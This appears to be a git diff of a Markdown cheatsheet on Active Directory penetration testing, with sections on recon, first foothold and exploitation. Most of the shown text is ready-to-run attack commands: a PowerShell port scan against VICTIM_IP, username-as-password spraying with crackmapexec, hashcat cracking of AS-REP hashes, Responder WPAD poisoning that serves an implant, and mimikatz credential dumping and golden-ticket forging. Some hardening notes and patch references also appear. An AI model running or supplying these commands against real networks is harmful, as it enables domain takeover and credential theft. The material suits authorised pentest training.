@@ -1,6 +1,35 @@
 # Recon
 
-# Unauthenticated enumeration
+## Unauthenticated enumeration
+
+```
+whoami
+systeminfo
+hostname
+whoami /priv
+net users
+net localgroup
+findstr /spin "password"*.*
+nslookup .
+gpresult /R
+set
+echo %envar% (CMD)
+$env:envar (PowerShell)
+Get-WmiObject Win32_ComputerSystem
+klist
+klist tgt
+```
+
+PowerShelll port scan
+```
+0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(VICTIM_IP,$_)) "Port $_ is open!"} 2>$null
+```
+
+AD search GUI
+Copy **dsquery.dll** from *C:\Windows\System32*
+```
+rundll32 dsquery.dll,OpenqueryWindow
+```
 
 # First foothold
 
@@ -24,7 +53,6 @@ Sometimes trying different mac address such as MacOS device, Switch/Routers, Vmw
 - Apple : F8:FF:C2:23:32:43
 
 - https://www.thehacker.recipes/physical/networking/network-access-control
-- 
 
 ### Username == password
 Using crackmapexec to test for password equal to username on domain contoso.com
@@ -38,7 +66,7 @@ for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -
 crackmapexec smb all_ips.txt | grep -a "SMBv1:True" | cut -d " " -f 10
 ```
 
-## SMB Signing
+### SMB Signing
 ```
 crackmapexec smb all_ips.txt | grep -a "signing:False" | cut -d " " -f 10
 ```
@@ -80,6 +108,16 @@ hashcat -m 18200 'asrep-roast.hashes' -a 0 ./wordlists/rockyou.txt
 
 
 # Authenticated enumeration
+
+```
+nltest /domain_trusts
+nltest /trusted_domains
+nltest /primary
+nltest /sc_query:<domain>
+nltest /dclist:<domain>
+nltest /dsgetsite
+nltest /whowill:<domain> <user>
+```
 
 ### Domain policy using PowerView
 ```
@@ -199,11 +237,29 @@ PowerView's functionalities in Python, using the wonderful impacket library.
 python pywerview.py get-netuser -w company.local -u jdoe --dc-ip 192.168.0.10 --username jdoe
 ```
 
+### Recon/Enumeration using BloodHound
+```
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+```
+
 ### Expanding BloodHound
 - https://github.com/hausec/Bloodhound-Custom-Queries
 - https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
 - https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/
 - https://neo4j.com/docs/api/python-driver/current/
+
+### Domain Enumeration - Defense
+- https://stealthbits.com/blog/making-internal-reconnaissance-harder-using-netcease-and-samri1o/
+
+- [NetCease](./Tools/NetCease.ps1) 
+This script changes permissions on the *NetSessionEnum()* method by removing permission for *Authenticated Users Group*.
+
+- RestrictRemoteSAM registry key
+Microsoft Introduced protections for querying the Remote SAM with Windows 10 and in 2017 introduced updates for previous operating systems down to Windows 7 and Server 2008 R2 using the RestrictRemoteSAM registry key.
+
+- SAMRi10
+PowerShell (PS) script which alters remote SAM access default permissions on Windows 10 & Windows Server 2016. This hardening process prevents attackers from easily getting some valuable recon information to move laterally within their victim’s network.
 
 
 # Exploitation
@@ -446,7 +502,7 @@ Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from th
 A WPAD server provides client proxy settings via a particular URL:
 - http://wpad.example.org/wpad.dat
 
---> When a machine has these protocols enabled, if the local network DNS is not able to resolve the name, the machine will ask to all hosts of the network.
+--> When a machine has these protocols enabled, if the local network DNS is not able to resolve the name, the machine will ask to all hosts of the network.  
 
 Using Responder we can poison DNS, DHCP, LLMNR and NBT-NS traffic to redirect clients to a malicious WPAD Server.
 ```
@@ -461,9 +517,11 @@ Modify Responder configuration file
 Serve-Html = On
 ```
 
---> Create a specific web page for error or use the default one.
+--> Create a specific web page for error or use the default one.  
 
---> Create an implant to be downloaded by the client. By default the error message indicate this URL : ```http://isaProxysrv/ProxyClient.exe```
+--> Create an implant to be downloaded by the client. By default the error message indicate this URL : ```http://isaProxysrv/ProxyClient.exe```  
+
+--> Patch by Microsoft (MS16-077): Location of WPAD file is no longer requested via broadcast protocols bnut only via DNS.
 
 ### WSUS
 
@@ -580,6 +638,9 @@ crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
 ### samAccountName spoofing
 
 ### MiTM - IPv6 + NTLMRelayx
+- Windows prefers IPv6 by default.
+- DHCPv6 is constantly broadcasting to the entire network.
+
 - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
 
 
@@ -898,7 +959,7 @@ lsadump::secrets (get syskey information to decrypt secrets from the registry on
 lsadump::sam (Reading credentials from the SAM on disk)
 kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<krbtgt hash> /endin:<value> /renewmax:<value>
 keystroke logging
-``
+```
 
 Validate *RunAsPPL* is enable
 ```
@@ -1002,13 +1063,19 @@ Hashcat wordlist cracking
 
 <img src="./images/dpat.png" width="250"/>
 
-### Resources
+## Resources
+
+#### Red Team Cheatsheet 
+- https://0xsp.com/offensive/red-team-cheatsheet/
+
 #### PetitPotam and ADCS
 - https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services
 
 #### Active Directory Exploitation cheatsheet
 - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 
+#### Attacking Active Directory
+- https://www.youtube.com/watch?v=MIt-tIjMr08
 
 #### Kerberos Delegation
 - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
@@ -1047,14 +1114,10 @@ Tools:
 - [SyncAppvPublishingServer]()
 
 
+
 To use for the course
-- https://github.com/jwardsmith/Active-Directory-Exploitation
-- https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/
-- https://github.com/infosecn1nja/AD-Attack-Defense
+
 - https://h4ms1k.github.io/Red_Team_Active_Directory/#
-- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
-- https://book.hacktricks.xyz/windows/active-directory-methodology
 - https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html
 - https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
 - https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/amp/
